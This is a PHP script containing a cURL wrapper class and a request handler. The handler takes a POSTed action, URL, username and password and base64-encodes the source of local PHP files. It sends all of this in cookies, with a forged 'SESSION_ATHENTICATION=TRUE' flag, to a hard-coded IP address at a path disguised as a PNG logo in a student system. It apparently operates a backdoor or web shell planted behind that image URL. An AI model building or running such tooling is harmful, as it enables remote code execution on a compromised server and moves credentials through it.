<?php

class HTTP
{
    private $cURL;
    public $headers = [];
    public $cookies = [];
    public $useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36";
    public $timeout = 10;

    public function __construct()
    {
        $this->cURL = curl_init();
        curl_setopt($this->cURL, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($this->cURL, CURLOPT_CONNECTTIMEOUT, 0.1);
        curl_setopt($this->cURL, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($this->cURL, CURLOPT_COOKIEFILE, '');
        curl_setopt($this->cURL, CURLOPT_COOKIEJAR, '');
    }

    public function get($url)
    {
        return $this->sendRequest('GET', $url);
    }

    public function post($url, $data = null)
    {
        return $this->sendRequest('POST', $url, $data);
    }

    private function sendRequest($method, $url, $data = null)
    {
        // Get all the headers
        $this->headers = array_merge($this->headers, $this->headers);
        $this->cookies = array_merge($this->cookies, $this->cookies);
        // Get all the cookies
        curl_setopt($this->cURL, CURLOPT_URL, $url);
        curl_setopt($this->cURL, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($this->cURL, CURLOPT_USERAGENT, $this->useragent);
        curl_setopt($this->cURL, CURLOPT_TIMEOUT, $this->timeout);
        curl_setopt($this->cURL, CURLOPT_RETURNTRANSFER, true);

        if (!empty($this->headers))
        {
            $formattedHeaders = [];
            foreach ($this->headers as $key => $value)
            {
                $formattedHeaders[] = $key . ': ' . $value;
            }
            curl_setopt($this->cURL, CURLOPT_HTTPHEADER, $formattedHeaders);
        }

        if (!empty($this->cookies))
        {
            $formattedCookies = [];
            foreach ($this->cookies as $key => $value)
            {
                $formattedCookies[] = $key . '=' . $value;
            }
            $cookieString = implode('; ', $formattedCookies);
            curl_setopt($this->cURL, CURLOPT_COOKIE, $cookieString);
        }

        if (!is_null($data))
        {
            curl_setopt($this->cURL, CURLOPT_POSTFIELDS, $data);
        }

        $response = curl_exec($this->cURL);

        if ($response === false)
        {
            $error = curl_error($this->cURL);
            throw new Exception('HTTP request failed: ' . $error);
        }

        return $response;
    }

    public function __destruct()
    {
        curl_close($this->cURL);
    }
}









if (isset($_POST['action']))
{
    $action = $_POST['action'];
}
else
{
    die('Action was not set!');
}



$request = new HTTP();
$useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36";
$url = 'http://202.142.148.4:8080/POWERSMS/student/imgs/logo5%20-%20Copy.png';
$headers =
[
    'Content-Type' => 'application/json'
];
if ($action == 'fetch')
{
    $cookies =
    [
        'SESSION_ATHENTICATION' => 'TRUE',
        'url' => urlencode($_POST['url']),
        'user' => $_POST['user'],
        'pass' => $_POST['pass'],
        'code' => base64_encode(substr(file_get_contents("fetch.php"),5,-3)),
        'name' => $_POST['name'],
        'date' => $_POST['date']
    ];
}
elseif ($action == 'update')
{
    $cookies =
    [
        'SESSION_ATHENTICATION' => 'TRUE',
        'url' => urlencode($_POST['url']),
        'user' => $_POST['user'],
        'pass' => $_POST['pass'],
        'code' => base64_encode(substr(file_get_contents("update.php"),5,-3)),
        'id' => $_POST['id'],
        'seq' => $_POST['seq'],
        'status' => $_POST['status'],
        'date' => $_POST['date'],
        'time' => $_POST['time']
    ];
}

$request->useragent = $useragent;
$request->headers = $headers;
$request->cookies = $cookies;
$request->timeout = 100;

$response = $request->get($url);
echo $response;

?>
